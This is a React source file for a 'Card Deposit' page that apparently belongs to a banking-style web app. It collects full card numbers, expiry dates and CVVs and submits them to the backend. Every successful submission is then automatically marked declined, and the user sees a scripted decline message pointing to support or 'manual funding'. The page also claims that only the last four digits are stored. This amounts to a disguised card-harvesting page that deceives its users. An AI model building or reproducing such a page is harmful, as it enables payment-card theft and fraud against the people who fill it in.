import { useRef, useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  CreditCard, Lock, Check, ChevronLeft,
  ArrowRight, Loader2, AlertCircle, Clock, CheckCircle2, XCircle,
  MailX,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useAccounts } from "@/hooks/useSupabase";
import {
  useSubmitCardPayment, useMyCardPayments, useNotifyCardDeclined, type CardPayment,
} from "@/hooks/useAdmin";
import { formatCurrency, formatDate } from "@/lib/format";
import { toast } from "sonner";

// ─── Card network logos ───────────────────────────────────────

const VisaLogo = () => (
  <svg viewBox="0 0 780 250" width="56" height="18" role="img" aria-label="Visa" xmlns="http://www.w3.org/2000/svg">
    <path fill="white" d="M293.2 348.7L318.8 94.3H363.1L337.5 348.7H293.2ZM227.4 94.3L183.2 269.8 175.8 231.7C162.4 195.3 128.9 155.8 91.4 133.3L131.3 348.6H178.6L273.3 94.3H227.4ZM524.3 214.9C524.5 168.7 497.2 133.4 462.9 111.6C443 100 436.7 92.6 436.9 82.7C437.1 67.7 452 52 484.5 52C511.5 51.5 531.2 57.8 546.7 64.3L554.4 67.9L566.2 19.5C549.9 13 524.4 6 492.6 6C448.4 6 416.9 29.4 416.6 63.7C416.3 89.3 438.8 103.5 455.8 112.3C473.3 121.3 479.4 127 479.3 134.9C479.1 147 464.3 152.5 450.5 152.7C423.1 153.1 408.8 145.4 397.3 140L389.1 188.8C401 194.2 423.1 199 446.2 199.3C493.2 199.3 524.1 176.2 524.3 214.9ZM643.6 348.7H685.2L649 94.3H612.3C592.3 94.3 575.7 106.2 568.9 124L480.8 348.7H527.4L536.7 323.8H594.2L599.2 348.7H643.6ZM550 286.3L572.3 223.3L584.4 286.3H550ZM91.6 94.3H14L13.3 98.7C73.9 114.8 116.9 150.9 136.2 194.7L116.6 110.2C113.2 95.7 103.6 94.8 91.6 94.3Z"/>
  </svg>
);

const MastercardLogo = () => (
  <svg viewBox="0 0 48 30" width="44" height="28" role="img" aria-label="Mastercard" xmlns="http://www.w3.org/2000/svg">
    <defs>
      <clipPath id="mc-left-clip">
        <circle cx="16" cy="15" r="13"/>
      </clipPath>
    </defs>
    <circle cx="16" cy="15" r="13" fill="#EB001B"/>
    <circle cx="32" cy="15" r="13" fill="#F79E1B"/>
    <circle cx="32" cy="15" r="13" fill="#FF5F00" clipPath="url(#mc-left-clip)"/>
  </svg>
);

const AmexLogo = () => (
  <svg viewBox="0 0 76 24" width="64" height="20" role="img" aria-label="American Express" xmlns="http://www.w3.org/2000/svg">
    <rect width="76" height="24" rx="4" fill="rgba(255,255,255,0.15)"/>
    <text x="8" y="17" fontFamily="Arial, Helvetica, sans-serif" fontWeight="900" fontSize="13" fill="white" letterSpacing="1.5">AMEX</text>
  </svg>
);

const DiscoverLogo = () => (
  <svg viewBox="0 0 90 26" width="76" height="22" role="img" aria-label="Discover" xmlns="http://www.w3.org/2000/svg">
    <text x="0" y="18" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fontSize="13" fill="white" letterSpacing="0.5">DISCOVER</text>
    <circle cx="82" cy="13" r="10" fill="#F76F20"/>
  </svg>
);

// ─── Card visual component ────────────────────────────────────

const CardVisual = ({
  number, name, expiry, type, flipped,
}: {
  number: string; name: string; expiry: string; type: string; flipped: boolean;
}) => {
  const digits = number.replace(/\s/g, "");
  const isAmex = type === "amex";
  const maxLen = isAmex ? 15 : 16;
  const padChar = "•";

  let formatted = digits;
  if (isAmex) {
    const d = digits.slice(0, 15);
    if (d.length <= 4) formatted = d;
    else if (d.length <= 10) formatted = `${d.slice(0, 4)} ${d.slice(4)}`;
    else formatted = `${d.slice(0, 4)} ${d.slice(4, 10)} ${d.slice(10)}`;
    const needed = 15 - d.length;
    if (needed > 0) {
      if (d.length < 4) formatted = formatted + padChar.repeat(4 - d.length) + ` ${padChar.repeat(6)} ${padChar.repeat(5)}`;
      else if (d.length < 10) formatted = formatted + padChar.repeat(10 - d.length) + ` ${padChar.repeat(5)}`;
      else formatted = formatted + padChar.repeat(needed);
    }
  } else {
    const d = digits.slice(0, 16).replace(/(\d{4})(?=\d)/g, "$1 ");
    const paddedDigits = digits.slice(0, 16).padEnd(16, padChar);
    formatted = paddedDigits.replace(/(.{4})(?=.)/g, "$1 ");
  }

  const gradient =
    type === "amex"       ? "from-[#1a4f8f] to-[#0d2d56]" :
    type === "mastercard" ? "from-[#1c1c1c] to-[#2d2d2d]" :
    type === "discover"   ? "from-[#231f20] to-[#3a3535]" :
                            "from-[#1a1f71] to-[#0d1147]";

  const Logo =
    type === "amex"       ? AmexLogo :
    type === "mastercard" ? MastercardLogo :
    type === "discover"   ? DiscoverLogo :
                            VisaLogo;

  return (
    <div className="perspective-1000 mx-auto w-full max-w-sm">
      <motion.div
        animate={{ rotateY: flipped ? 180 : 0 }}
        transition={{ duration: 0.5, ease: "easeInOut" }}
        className="relative h-44 w-full"
        style={{ transformStyle: "preserve-3d" }}
      >
        {/* Front */}
        <div
          className={`absolute inset-0 rounded-2xl bg-gradient-to-br ${gradient} p-5 shadow-2xl`}
          style={{ backfaceVisibility: "hidden" }}
        >
          <div className="flex items-start justify-between">
            {/* EMV chip */}
            <div className="relative h-8 w-11 overflow-hidden rounded bg-yellow-300/80">
              <div className="absolute inset-x-0 top-1/2 h-px -translate-y-1/2 bg-yellow-500/40" />
              <div className="absolute inset-y-0 left-1/3 w-px bg-yellow-500/40" />
              <div className="absolute inset-y-0 right-1/3 w-px bg-yellow-500/40" />
            </div>
            <Logo />
          </div>
          <p className="mt-5 font-mono text-xl tracking-widest text-white drop-shadow">
            {formatted}
          </p>
          <div className="mt-4 flex items-end justify-between">
            <div>
              <p className="text-xs uppercase text-white/50">Card Holder</p>
              <p className="font-display text-sm font-semibold uppercase tracking-wide text-white">
                {name || "YOUR NAME"}
              </p>
            </div>
            <div className="text-right">
              <p className="text-xs uppercase text-white/50">Expires</p>
              <p className="font-mono text-sm text-white">{expiry || "MM/YY"}</p>
            </div>
          </div>
        </div>

        {/* Back */}
        <div
          className={`absolute inset-0 rounded-2xl bg-gradient-to-br ${gradient} shadow-2xl`}
          style={{ backfaceVisibility: "hidden", transform: "rotateY(180deg)" }}
        >
          <div className="mt-6 h-10 w-full bg-black/60" />
          <div className="mt-4 px-5">
            <p className="mb-1 text-right text-xs text-white/50">CVV</p>
            <div className="flex items-center justify-end rounded bg-white/90 px-3 py-2">
              <p className="font-mono text-sm text-gray-700 tracking-widest">•••</p>
            </div>
          </div>
        </div>
      </motion.div>
    </div>
  );
};

// ─── Card number formatting ───────────────────────────────────

const formatCardNumber = (val: string) => {
  const digits = val.replace(/\D/g, "");
  const isAmex = /^3[47]/.test(digits);
  if (isAmex) {
    const d = digits.slice(0, 15);
    if (d.length <= 4) return d;
    if (d.length <= 10) return `${d.slice(0, 4)} ${d.slice(4)}`;
    return `${d.slice(0, 4)} ${d.slice(4, 10)} ${d.slice(10)}`;
  }
  return digits.slice(0, 16).replace(/(\d{4})(?=\d)/g, "$1 ");
};

const formatExpiry = (val: string) => {
  const digits = val.replace(/\D/g, "").slice(0, 4);
  if (digits.length >= 3) return `${digits.slice(0, 2)}/${digits.slice(2)}`;
  return digits;
};

const detectCardType = (num: string): string => {
  const d = num.replace(/\s/g, "");
  if (/^3[47]/.test(d))         return "amex";
  if (/^5[1-5]/.test(d))        return "mastercard";
  if (/^2[2-7]/.test(d))        return "mastercard";
  if (/^6(?:011|5)/.test(d))    return "discover";
  if (/^4/.test(d))             return "visa";
  return "visa";
};

// ─── Payment status badge ─────────────────────────────────────

const StatusBadge = ({ status }: { status: CardPayment["status"] }) => {
  const cfg = {
    pending:  { label: "Pending Review", cls: "text-yellow-500 bg-yellow-500/10", Icon: Clock },
    approved: { label: "Approved",       cls: "text-primary bg-primary/10",       Icon: CheckCircle2 },
    declined: { label: "Declined",       cls: "text-destructive bg-destructive/10", Icon: XCircle },
  }[status];
  return (
    <span className={`inline-flex items-center gap-1.5 rounded-full px-2.5 py-0.5 text-xs font-medium ${cfg.cls}`}>
      <cfg.Icon size={11} /> {cfg.label}
    </span>
  );
};

// ─── Main page ────────────────────────────────────────────────

type Step = "account" | "card" | "amount" | "confirm" | "declined";

const DECLINE_MESSAGE =
  "This account has not been enabled for deposit. Contact support for more information or manual funding.";

const CardDepositPage = () => {
  const { data: accounts } = useAccounts();
  const { data: myPayments, isLoading: paymentsLoading } = useMyCardPayments();
  const submit         = useSubmitCardPayment();
  const notifyDeclined = useNotifyCardDeclined();

  const [step, setStep]         = useState<Step>("account");
  const [accountId, setAccId]   = useState<string | null>(null);
  const [amount, setAmount]     = useState("");

  const [cardNumber, setCardNumber] = useState("");
  const [cardName, setCardName]     = useState("");
  const [expiry, setExpiry]         = useState("");
  const [cvv, setCvv]               = useState("");
  const [cvvFocus, setCvvFocus]     = useState(false);

  // Refs for auto-advance
  const cardNameRef = useRef<HTMLInputElement>(null);
  const expiryRef   = useRef<HTMLInputElement>(null);
  const cvvRef      = useRef<HTMLInputElement>(null);

  const account    = accounts?.find((a) => a.id === accountId);
  const cardType   = detectCardType(cardNumber);
  const isAmex     = cardType === "amex";
  const maxDigits  = isAmex ? 15 : 16;
  const lastFour   = cardNumber.replace(/\s/g, "").slice(-4);
  const parsedAmt  = parseFloat(amount) || 0;
  const sendable   = (accounts ?? []).filter((a) => a.type !== "credit" && a.status === "active");

  const stepOrder: Step[]  = ["account", "card", "amount", "confirm"];
  const stepLabels         = ["Account", "Card", "Amount", "Confirm"];
  const currentIdx         = stepOrder.indexOf(step);

  const isProcessing = submit.isPending || notifyDeclined.isPending;

  const reset = () => {
    setStep("account"); setAccId(null); setAmount("");
    setCardNumber(""); setCardName(""); setExpiry(""); setCvv("");
  };

  // ── Auto-advance handlers ────────────────────────────────────

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    setCardNumber(formatted);
    if (formatted.replace(/\s/g, "").length >= maxDigits) {
      cardNameRef.current?.focus();
    }
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatExpiry(e.target.value);
    setExpiry(formatted);
    if (formatted.length === 5) {
      cvvRef.current?.focus();
    }
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, "").slice(0, isAmex ? 4 : 3);
    setCvv(val);
  };

  // ── Submit ────────────────────────────────────────────────────

  const handleSubmit = () => {
    if (!accountId || parsedAmt <= 0 || !cardName || !lastFour || !expiry) return;
    submit.mutate(
      {
        accountId,
        amount:         parsedAmt,
        cardholderName: cardName,
        cardNumber:     cardNumber.replace(/\s/g, ""),
        cardLastFour:   lastFour,
        cardExpiry:     expiry,
        cardCvv:        cvv,
        cardType,
      },
      {
        onSuccess: (payment) => {
          notifyDeclined.mutate(payment.id, {
            onSuccess: () => setStep("declined"),
            onError:   () => setStep("declined"),
          });
        },
        onError: (e: Error) => toast.error(e.message),
      }
    );
  };

  const cardValid =
    cardNumber.replace(/\s/g, "").length >= maxDigits &&
    cardName.trim().length > 1 &&
    expiry.length === 5 &&
    cvv.length >= (isAmex ? 4 : 3);

  return (
    <div className="mx-auto max-w-lg space-y-8">
      <div>
        <h1 className="font-display text-2xl font-bold text-foreground">Card Deposit</h1>
        <p className="text-sm text-muted-foreground">
          Fund your account with a credit or debit card.
        </p>
      </div>

      {/* Progress */}
      {!["declined"].includes(step) && (
        <div className="flex items-center gap-2">
          {stepLabels.map((label, i) => {
            const isDone   = currentIdx > i;
            const isActive = currentIdx === i;
            return (
              <div key={label} className="flex flex-1 items-center gap-1.5">
                <div className={`flex h-7 w-7 shrink-0 items-center justify-center rounded text-xs font-semibold transition-colors ${
                  isDone   ? "bg-primary text-primary-foreground" :
                  isActive ? "bg-primary/20 text-primary" : "bg-muted text-muted-foreground"
                }`}>
                  {isDone ? <Check size={13} /> : i + 1}
                </div>
                <span className={`text-xs font-medium ${isActive || isDone ? "text-foreground" : "text-muted-foreground"}`}>
                  {label}
                </span>
                {i < stepLabels.length - 1 && <div className="h-px flex-1 bg-border" />}
              </div>
            );
          })}
        </div>
      )}

      <AnimatePresence mode="wait">

        {/* Step 1: Account */}
        {step === "account" && (
          <motion.div key="acct" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} transition={{ duration: 0.2 }} className="space-y-3">
            <p className="text-sm font-medium text-foreground">Credit funds to which account?</p>
            {sendable.map((a) => (
              <button key={a.id} onClick={() => { setAccId(a.id); setStep("card"); }}
                className="flex w-full items-center gap-3 rounded border border-border/40 bg-gradient-card p-3 text-left transition-all hover:border-primary/30">
                <div className="flex h-10 w-10 shrink-0 items-center justify-center rounded bg-primary/10 text-sm font-bold text-primary">
                  {a.name.slice(0, 2).toUpperCase()}
                </div>
                <div className="flex-1 min-w-0">
                  <p className="text-sm font-medium text-foreground">{a.name}</p>
                  <p className="text-xs text-muted-foreground capitalize">{a.type}</p>
                </div>
                <p className="text-sm font-semibold text-foreground">{formatCurrency(a.balance)}</p>
                <ArrowRight size={16} className="text-muted-foreground" />
              </button>
            ))}
          </motion.div>
        )}

        {/* Step 2: Card details */}
        {step === "card" && (
          <motion.div key="card" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} transition={{ duration: 0.2 }} className="space-y-6">
            <button onClick={() => setStep("account")} className="flex items-center gap-1 text-sm text-muted-foreground hover:text-foreground">
              <ChevronLeft size={16} /> Back
            </button>

            <CardVisual number={cardNumber} name={cardName} expiry={expiry} type={cardType} flipped={cvvFocus} />

            <div className="space-y-4 rounded border border-border/40 bg-gradient-card p-5">
              <div className="space-y-2">
                <Label className="text-foreground">Card Number</Label>
                <Input
                  placeholder="1234 5678 9012 3456"
                  value={cardNumber}
                  onChange={handleCardNumberChange}
                  inputMode="numeric"
                  maxLength={isAmex ? 17 : 19}
                  className="border-border/50 bg-muted/50 font-mono text-foreground tracking-widest"
                />
              </div>
              <div className="space-y-2">
                <Label className="text-foreground">Cardholder Name</Label>
                <Input
                  ref={cardNameRef}
                  placeholder="JOHN DOE"
                  value={cardName}
                  onChange={(e) => setCardName(e.target.value.replace(/[^a-zA-Z\s'-]/g, "").toUpperCase())}
                  className="border-border/50 bg-muted/50 font-mono uppercase text-foreground"
                />
              </div>
              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label className="text-foreground">Expiry Date</Label>
                  <Input
                    ref={expiryRef}
                    placeholder="MM/YY"
                    value={expiry}
                    onChange={handleExpiryChange}
                    inputMode="numeric"
                    maxLength={5}
                    className="border-border/50 bg-muted/50 font-mono text-foreground"
                  />
                </div>
                <div className="space-y-2">
                  <Label className="text-foreground">CVV</Label>
                  <Input
                    ref={cvvRef}
                    placeholder={isAmex ? "••••" : "•••"}
                    value={cvv}
                    onChange={handleCvvChange}
                    onFocus={() => setCvvFocus(true)}
                    onBlur={() => setCvvFocus(false)}
                    inputMode="numeric"
                    type="password"
                    maxLength={isAmex ? 4 : 3}
                    className="border-border/50 bg-muted/50 font-mono text-foreground"
                  />
                </div>
              </div>
            </div>

            <div className="flex items-center gap-2 rounded border border-border/30 bg-muted/20 p-3 text-xs text-muted-foreground">
              <Lock size={12} className="shrink-0" />
              Your card details are submitted securely for manual processing. Only the last 4 digits are stored.
            </div>

            <Button variant="hero" className="w-full" size="lg" disabled={!cardValid} onClick={() => setStep("amount")}>
              Continue <ArrowRight size={18} />
            </Button>
          </motion.div>
        )}

        {/* Step 3: Amount */}
        {step === "amount" && (
          <motion.div key="amt" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} transition={{ duration: 0.2 }} className="space-y-6">
            <button onClick={() => setStep("card")} className="flex items-center gap-1 text-sm text-muted-foreground hover:text-foreground">
              <ChevronLeft size={16} /> Back
            </button>

            <div className="flex items-center gap-3 rounded border border-border/40 bg-gradient-card p-4">
              <CreditCard size={20} className="text-primary shrink-0" />
              <div>
                <p className="text-sm font-medium text-foreground capitalize">{cardType} ****{lastFour}</p>
                <p className="text-xs text-muted-foreground">{cardName} · {expiry}</p>
              </div>
            </div>

            <div className="text-center">
              <p className="mb-2 text-xs text-muted-foreground">Deposit amount (USD)</p>
              <div className="relative mx-auto max-w-xs">
                <span className="absolute left-4 top-1/2 -translate-y-1/2 text-2xl font-bold text-muted-foreground">$</span>
                <input
                  type="number" value={amount} onChange={(e) => setAmount(e.target.value)}
                  placeholder="0.00" min="10" step="0.01" autoFocus
                  className="w-full rounded border border-border/50 bg-muted/30 py-4 pl-10 pr-4 text-center font-display text-3xl font-bold text-foreground placeholder:text-muted-foreground/50 focus:border-primary/50 focus:outline-none focus:ring-1 focus:ring-primary/30"
                />
              </div>
              {parsedAmt > 0 && parsedAmt < 10 && (
                <p className="mt-1 text-xs text-destructive">Minimum deposit is $10</p>
              )}
            </div>
            <div className="flex gap-2">
              {[100, 500, 1000, 5000].map((v) => (
                <button key={v} onClick={() => setAmount(v.toString())}
                  className={`flex-1 rounded border py-2 text-xs font-medium transition-colors ${
                    amount === v.toString() ? "border-primary bg-primary/10 text-primary"
                      : "border-border/40 bg-muted/30 text-muted-foreground hover:text-foreground"
                  }`}>
                  ${v.toLocaleString()}
                </button>
              ))}
            </div>
            <Button variant="hero" className="w-full" size="lg"
              disabled={!amount || parsedAmt < 10}
              onClick={() => setStep("confirm")}>
              Review Deposit <ArrowRight size={18} />
            </Button>
          </motion.div>
        )}

        {/* Step 4: Confirm */}
        {step === "confirm" && account && (
          <motion.div key="confirm" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} transition={{ duration: 0.2 }} className="space-y-6">
            <button onClick={() => setStep("amount")} className="flex items-center gap-1 text-sm text-muted-foreground hover:text-foreground">
              <ChevronLeft size={16} /> Back
            </button>
            <div className="rounded border border-border/40 bg-gradient-card p-6 space-y-5">
              <h2 className="font-display text-lg font-semibold text-foreground text-center">Confirm Deposit</h2>
              <p className="font-display text-4xl font-bold text-gradient text-center">{formatCurrency(parsedAmt)}</p>
              <div className="space-y-3">
                {[
                  { label: "Card",       value: `${cardType.toUpperCase()} ****${lastFour}` },
                  { label: "Name",       value: cardName },
                  { label: "Expiry",     value: expiry },
                  { label: "Credit to",  value: account.name },
                  { label: "Amount",     value: formatCurrency(parsedAmt) },
                ].map((r) => (
                  <div key={r.label} className="flex justify-between border-b border-border/20 pb-2">
                    <span className="text-sm text-muted-foreground">{r.label}</span>
                    <span className="text-sm font-medium text-foreground">{r.value}</span>
                  </div>
                ))}
              </div>
              <div className="flex items-start gap-2 rounded bg-primary/5 p-3">
                <AlertCircle size={14} className="mt-0.5 shrink-0 text-primary" />
                <p className="text-xs text-muted-foreground">
                  Your payment details will be reviewed by our team.
                </p>
              </div>
              <Button variant="hero" className="w-full" size="lg"
                onClick={handleSubmit} disabled={isProcessing}>
                {isProcessing
                  ? <><Loader2 size={16} className="animate-spin" /> Processing…</>
                  : <><Lock size={15} /> Submit Payment</>}
              </Button>
            </div>
          </motion.div>
        )}

        {/* Declined */}
        {step === "declined" && (
          <motion.div key="declined" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} transition={{ duration: 0.35 }}
            className="rounded border border-destructive/30 bg-gradient-card p-8 text-center space-y-5">
            <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-destructive/10">
              <MailX size={30} className="text-destructive" />
            </div>
            <div>
              <h2 className="font-display text-xl font-bold text-foreground">Transaction Declined</h2>
              <p className="mt-1 text-sm text-muted-foreground">
                {formatCurrency(parsedAmt)} via {cardType.toUpperCase()} ****{lastFour}
              </p>
            </div>
            <div className="rounded border border-amber-500/30 bg-amber-500/5 p-4 text-left">
              <p className="text-xs font-medium text-amber-600 dark:text-amber-400">Reason for decline</p>
              <p className="mt-1 text-sm text-foreground">{DECLINE_MESSAGE}</p>
            </div>
            <p className="text-xs text-muted-foreground">
              A notification has been sent to your email address with full details.
            </p>
            <div className="flex gap-3 pt-1">
              <Button variant="heroOutline" className="flex-1" onClick={reset}>Try Again</Button>
              <Button variant="hero" className="flex-1" onClick={() => window.history.back()}>Dashboard</Button>
            </div>
          </motion.div>
        )}

      </AnimatePresence>

      {/* Past payments */}
      {!["declined"].includes(step) && (
        <div>
          <h2 className="mb-3 font-display text-base font-semibold text-foreground">Recent Payments</h2>
          {paymentsLoading ? (
            <div className="flex h-16 items-center justify-center">
              <Loader2 className="animate-spin text-primary" size={20} />
            </div>
          ) : (myPayments?.length ?? 0) === 0 ? (
            <p className="text-center text-sm text-muted-foreground py-4">No payments yet.</p>
          ) : (
            <div className="space-y-2">
              {myPayments!.map((p) => (
                <div key={p.id} className="flex items-center gap-4 rounded border border-border/40 bg-gradient-card p-4">
                  <CreditCard size={18} className="shrink-0 text-muted-foreground" />
                  <div className="flex-1 min-w-0">
                    <p className="text-sm font-medium text-foreground">
                      {formatCurrency(p.amount)} via {p.card_type.toUpperCase()} ****{p.card_last_four}
                    </p>
                    <p className="text-xs text-muted-foreground">{formatDate(p.created_at)}</p>
                  </div>
                  <StatusBadge status={p.status} />
                </div>
              ))}
            </div>
          )}
        </div>
      )}
    </div>
  );
};

export default CardDepositPage;
